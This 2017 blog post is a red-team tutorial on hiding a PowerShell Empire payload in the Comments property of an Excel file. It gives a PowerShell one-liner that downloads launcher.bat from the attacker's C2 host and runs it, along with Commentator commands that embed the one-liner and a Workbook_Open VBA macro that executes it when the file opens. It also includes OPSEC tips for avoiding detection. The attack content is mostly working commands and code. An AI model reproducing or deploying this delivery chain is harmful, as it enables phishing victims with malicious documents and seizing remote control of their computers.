---
title: "Executing Metasploit & Empire Payloads from MS Office Document Properties (part 2 of 2)"
date: 2017-12-06
draft: false
toc: false
images:
  - "/wp-content/uploads/2017/12/Metasploit-1.png"
categories:
  - Security
tags:
  - Empire
  - Penetration Testing
  - PowerShell
  - Red Teaming
  - security
---
<p>Building on from my previous post, this will primarily focus on delivering an Empire payload via an embedded offensive PowerShell script stored within the ‘comments’ property of an MS Excel document.</p>



<p><strong>PowerShell Empire:</strong></p>



<p>Begin by creating an Empire listener, see Empire’s documentation on how to get started with this by visiting the following URL: <a href="https://www.powershellempire.com/?page_id=83">https://www.powershellempire.com/?page_id=83</a></p>



<p>Note that in my configuration as illustrated in the screenshot below, the ‘Host’ entry, does not correspond to my C2 Empire Server, instead, this has been configured to point to a reverse-proxy utilising TLS / SSL encryption.  This is considered to be good ‘OPSEC’ practice and allows easier portability.</p>



<p>The ‘Slack’ configuration has also been configured so that notifications will appear in our chosen Slack channel when agents are established.</p>



<p>Note: The agent strings were left in their default configuration, I advise these to be changed on actual engagements, as Nessus has the ability to detect Empire Listeners via the plugin id: <em>99592</em></p>



<p><a href="https://www.tenable.com/plugins/index.php?view=single&amp;id=99592">https://www.tenable.com/plugins/index.php?view=single&amp;id=99592</a></p>



<figure class="wp-block-image"><a href="/wp-content/uploads/2017/12/ks-empire1.jpg"><img decoding="async" width="602" height="535" src="/wp-content/uploads/2017/12/ks-empire1.jpg" alt="" class="wp-image-1538" srcset="/wp-content/uploads/2017/12/ks-empire1.jpg 602w, /wp-content/uploads/2017/12/ks-empire1-300x267.jpg 300w" sizes="(max-width: 602px) 100vw, 602px"></a></figure>



<p>The next part of the process is to create a stager, this is our payload we’ll use when weaponizing a MS Excel document.  For this example I’m going to use the self-deleting .bat executable:</p>



<p><em>Empire: listeners) &gt; usestager windows/launcher_bat</em></p>



<p><em>(Empire: stager/windows/launcher_bat) &gt; set Listener http</em></p>



<figure class="wp-block-image"><a href="/wp-content/uploads/2017/12/ks-empire2.jpg"><img loading="lazy" decoding="async" width="602" height="458" src="/wp-content/uploads/2017/12/ks-empire2.jpg" alt="" class="wp-image-1539" srcset="/wp-content/uploads/2017/12/ks-empire2.jpg 602w, /wp-content/uploads/2017/12/ks-empire2-300x228.jpg 300w" sizes="auto, (max-width: 602px) 100vw, 602px"></a></figure>



<p>By default, the payload will be written to /tmp.  Serve the payload via HTTP by launching a Python HTTP Server:</p>



<pre class="wp-block-code lang:default decode:true"><code>root@kali:/tmp# python -m SimpleHTTPServer

Serving HTTP on 0.0.0.0 port 8000 ...</code></pre>



<p>Now it comes to weaponizing the MS Excel document, the steps in order to do this is similar to before, except the following offensive PowerShell script will be used to embed inside the ‘Comments’ property of the MS Excel document:</p>



<p><em>PowerShell (New-Object System.Net.WebClient).DownloadFile(‘http://192.168.0.11:8000/launcher.bat’,’test.bat’);Start-Process ‘test.bat’</em></p>



<p><strong>Note: The IP address: 192.168.0.11 is our Empire C2 server which is serving the launcher.bat payload.  This will likely to be different in your environment.</strong></p>



<p>Upon execution, the PowerShell script will retrieve the Empire payload and execute it on the victim host.</p>



<p>In order to embed this command into a MS Excel document within the ‘comments’ property and execute it from an embedded Macro.  This can easily be done by using the PowerShell script: ‘Commentator’ (<a href="https://github.com/clr2of8/Commentator">https://github.com/clr2of8/Commentator</a>)</p>



<p>Begin by starting PowerShell:</p>



<pre class="wp-block-code lang:default decode:true"><code>powershell.exe -exec bypass</code></pre>



<p>Import the module into your PowerShell environment:</p>



<pre class="wp-block-code lang:default decode:true"><code>Import-Module .\Commentator.ps1</code></pre>



<p>And execute the script to embed our payload into the ‘comments’ property of the MS Excel document:</p>



<pre class="wp-block-code lang:default decode:true"><code>Invoke-Commentator -OfficeFile .\empire_posh_delivery.xlsx –CommentFile .\empire_posh_payload.txt</code></pre>



<p><strong>Note: Given the size of the PowerShell script above, this was placed within the text file: <em>empire_posh_payload.txt</em></strong></p>



<p>After successful execution, a copy of your existing MS Office file will be created with the payload embedded:</p>



<p><em>The new file with added comment has been written to .\empire_posh_delivery-wlc.xlsx.</em></p>



<p><em>DONE!</em></p>



<p>This can be verified by inspecting the file’s metadata / properties:</p>



<figure class="wp-block-image"><a href="/wp-content/uploads/2017/12/ks-empire3.jpg"><img loading="lazy" decoding="async" width="289" height="406" src="/wp-content/uploads/2017/12/ks-empire3.jpg" alt="" class="wp-image-1540" srcset="/wp-content/uploads/2017/12/ks-empire3.jpg 289w, /wp-content/uploads/2017/12/ks-empire3-214x300.jpg 214w" sizes="auto, (max-width: 289px) 100vw, 289px"></a></figure>



<p>Lastly, in order to execute the payload embedded within the ‘comments’ property, the following embedded Macro can be used:</p>



<pre class="wp-block-code lang:default decode:true"><code>Sub Workbook_Open()

Dim p As DocumentProperty

 

 For Each p In ActiveWorkbook.BuiltinDocumentProperties

    If p.Name = "Comments" Then

        Shell (p.Value)

    End If

 Next

End Sub</code></pre>



<p><strong>Note: In order to utilise auto-execution via the ‘<em>Workbook_Open()</em>’ function, the weaponised MS Excel document needed to be downgraded to Office 98 – 2003 compatibility (.xls)</strong></p>



<figure class="wp-block-image"><a href="/wp-content/uploads/2017/12/ks-empire4.jpg"><img loading="lazy" decoding="async" width="601" height="235" src="/wp-content/uploads/2017/12/ks-empire4.jpg" alt="" class="wp-image-1541" srcset="/wp-content/uploads/2017/12/ks-empire4.jpg 601w, /wp-content/uploads/2017/12/ks-empire4-300x117.jpg 300w" sizes="auto, (max-width: 601px) 100vw, 601px"></a></figure>



<p>After the victim has clicked ‘enable editing’ and ‘enable content’, an Empire agent session should appear:</p>



<figure class="wp-block-image"><a href="/wp-content/uploads/2017/12/ks-empire5.jpg"><img loading="lazy" decoding="async" width="601" height="108" src="/wp-content/uploads/2017/12/ks-empire5.jpg" alt="" class="wp-image-1542" srcset="/wp-content/uploads/2017/12/ks-empire5.jpg 601w, /wp-content/uploads/2017/12/ks-empire5-300x54.jpg 300w" sizes="auto, (max-width: 601px) 100vw, 601px"></a></figure>



<figure class="wp-block-image"><a href="/wp-content/uploads/2017/12/ks-empire6.jpg"><img loading="lazy" decoding="async" width="375" height="189" src="/wp-content/uploads/2017/12/ks-empire6.jpg" alt="" class="wp-image-1537" srcset="/wp-content/uploads/2017/12/ks-empire6.jpg 375w, /wp-content/uploads/2017/12/ks-empire6-300x151.jpg 300w" sizes="auto, (max-width: 375px) 100vw, 375px"></a></figure>
        <h3 class="awpa-title">About The Author</h3>
                        <div class="wp-post-author-wrap wp-post-author-shortcode left">
                                                                <div class="awpa-tab-content active" id="1_awpa-tab1">
                                    <div class="wp-post-author">
            <div class="awpa-img awpa-author-block square">
                <a href="/author/jps_admin/"><img alt="" src="https://secure.gravatar.com/avatar/e81af0ed037c0b2a88af1d9d8d4be2515f721f9b7ccf9ae910576d539feff4fb?s=150&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/e81af0ed037c0b2a88af1d9d8d4be2515f721f9b7ccf9ae910576d539feff4fb?s=300&amp;d=mm&amp;r=g 2x" class="avatar avatar-150 photo" height="150" width="150"></a>
               
               
            </div>
            <div class="wp-post-author-meta awpa-author-block">
                <h4 class="awpa-display-name">
                    <a href="/author/jps_admin/">Smittix</a>
                    
                </h4>
                

                
                <div class="wp-post-author-meta-bio">
                                    </div>
                <div class="wp-post-author-meta-more-posts">
                    <p class="awpa-more-posts round">
                        <a href="/author/jps_admin/" class="awpa-more-posts">See author's posts</a>
                    </p>
                </div>
                                    <ul class="awpa-contact-info round">
                                                    
                                <li class="awpa-website-li">
                                    <a href="/" class="awpa-website awpa-icon-website"></a>
                                </li>
                                                                                                                                                                                        </ul>
                            </div>
        </div>

                                </div>
                                                            </div>
                        

        <div class="post-share">
            <div class="post-share-icons cf"> 
                                    <a class="facebook" href="https://www.facebook.com/sharer.php?u=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/" target="_blank">
                        <i class="fab fa-facebook"></i>
                    </a>
                                    <a class="x-twitter" href="http://twitter.com/share?url=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/&amp;text=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%202%20of%202%29" target="_blank">
                        <i class="fa-brands fa-x-twitter"></i>
                    </a>
                                    <a class="envelope" href="mailto:?subject=Executing%20Metasploit%20%26amp;%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20(part%202%20of%202)&amp;body=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/" target="_blank">
                        <i class="fas fa-envelope-open"></i>
                    </a>
                                    <a class="linkedin" href="https://www.linkedin.com/sharing/share-offsite/?url=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/&amp;title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%202%20of%202%29" target="_blank">
                        <i class="fab fa-linkedin"></i>
                    </a>
                                    <a href="javascript:pinIt();" class="pinterest">
                        <i class="fab fa-pinterest"></i>
                    </a>
                                    <a class="telegram" href="https://t.me/share/url?url=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/&amp;title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%202%20of%202%29" target="_blank">
                        <i class="fab fa-telegram"></i>
                    </a>
                                    <a class="whatsapp" href="https://api.whatsapp.com/send?text=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/&amp;title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%202%20of%202%29" target="_blank">
                        <i class="fab fa-whatsapp"></i>
                    </a>
                                    <a class="reddit" href="https://www.reddit.com/submit?url=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/&amp;title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%202%20of%202%29" target="_blank">
                        <i class="fab fa-reddit"></i>
                    </a>
                                <a class="print-r" href="javascript:window.print()"> <i class="fas fa-print"></i></a>
            </div>
        </div>
                        <div class="clearfix mb-3"></div>
                    
	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="/posts/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/" rel="prev"><div class="fas fa-angle-double-left"></div><span> Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 1 of 2)</span></a></div><div class="nav-next"><a href="/posts/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/" rel="next"><span>Efficient Time Based Blind SQL Injection using MySQL Bit Functions and Operators </span><div class="fas fa-angle-double-right"></div></a></div></div>
	</nav>
